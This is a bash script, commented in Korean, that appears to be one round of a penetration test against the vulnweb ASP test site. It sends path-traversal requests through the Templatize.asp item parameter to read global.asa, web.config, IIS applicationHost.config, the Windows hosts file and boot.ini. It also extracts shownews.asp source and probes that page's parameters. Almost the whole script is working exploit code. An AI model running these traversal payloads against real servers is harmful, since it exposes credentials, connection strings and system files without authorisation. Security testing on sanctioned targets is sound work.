#!/usr/bin/env bash
# Round 5 — Templatize.asp?item= 추가 민감 파일 읽기 + shownews.asp 파라미터 규명  [읽기 전용]
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; mkdir -p "$OUT"
CURL=(curl -s --noproxy '*' --max-time 25)

probe() { local label="$1" item="$2" url="$3"
  local code size
  read -r code size < <("${CURL[@]}" -o "$OUT/x_${label}.html" -w "%{http_code} %{size_download}" "$url")
  printf "%-24s %-52s %s %s\n" "$label" "$item" "$code" "$size"
}
echo "### C. 추가 민감 파일 읽기 (Templatize.asp?item=)"
printf "%-24s %-52s %s %s\n" "LABEL" "PATH" "CODE" "SIZE"
probe global_asa_root      "global.asa"                "$BASE/Templatize.asp?item=global.asa"
probe globalasa_via_html   "html/../global.asa"        "$BASE/Templatize.asp?item=html%2F..%2Fglobal.asa"
probe globalasa_dot        "./global.asa"              "$BASE/Templatize.asp?item=.%2Fglobal.asa"
probe webconfig_root       "web.config"                "$BASE/Templatize.asp?item=web.config"
probe logs_dir_webconfig   "html/../logs/web.config"   "$BASE/Templatize.asp?item=html%2F..%2Flogs%2Fweb.config"
probe apphost_webconfig    "../web.config"             "$BASE/Templatize.asp?item=..%2Fweb.config"
probe connstr_asa          "/global.asa"               "$BASE/Templatize.asp?item=%2Fglobal.asa"
probe mtemplates           "Templates/MainTemplate.dwt.asp" "$BASE/Templatize.asp?item=Templates%2FMainTemplate.dwt.asp"
probe loginput_via_html    "html/../logInput.asp"      "$BASE/Templatize.asp?item=html%2F..%2FlogInput.asp"
probe hosts_recheck        "..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts" \
                            "$BASE/Templatize.asp?item=..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts"
probe inetsrv_meta         "..%2f..%2f..%2fwindows%2fsystem32%2finetsrv%2fconfig%2fapplicationHost.config" \
                            "$BASE/Templatize.asp?item=..%2f..%2f..%2fwindows%2fsystem32%2finetsrv%2fconfig%2fapplicationHost.config"
probe win_backup           "..%2f..%2f..%2fwindows%2fwin.ini.bak" "$BASE/Templatize.asp?item=..%2f..%2f..%2fwindows%2fwin.ini.bak"
probe bootini              "..%2f..%2fboot.ini"       "$BASE/Templatize.asp?item=..%2f..%2fboot.ini"
probe scripts_log          "..%2f..%2f..%2fscripts%2flogInput.txt" "$BASE/Templatize.asp?item=..%2f..%2f..%2fscripts%2flogInput.txt"
echo
echo "### D. shownews.asp — 자체 소스에서 파라미터명 확인 + 라이브 오라클"
echo "-- 소스(Templatize 경유) 중 FName 설정부 --"
python3 - "$OUT" <<'EOF'
import re,sys,os
out=sys.argv[1]
s=open(os.path.join(out,"tpl_shownews_asp.html"),encoding="latin-1",errors="replace").read()
i=s.find("FName")
print(s[max(0,i-1500):i+400].replace("\r",""))
EOF
for u in "/shownews.asp" "/shownews.asp?id=1" "/shownews.asp?newsid=1" "/shownews.asp?fname=html/about.html" \
         "/shownews.asp?file=html/about.html" "/shownews.asp?item=html/about.html" "/shownews.asp?n=1" "/shownews.asp?note=1"; do
  printf "%-46s " "$u"
  "${CURL[@]}" -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE$u"
done
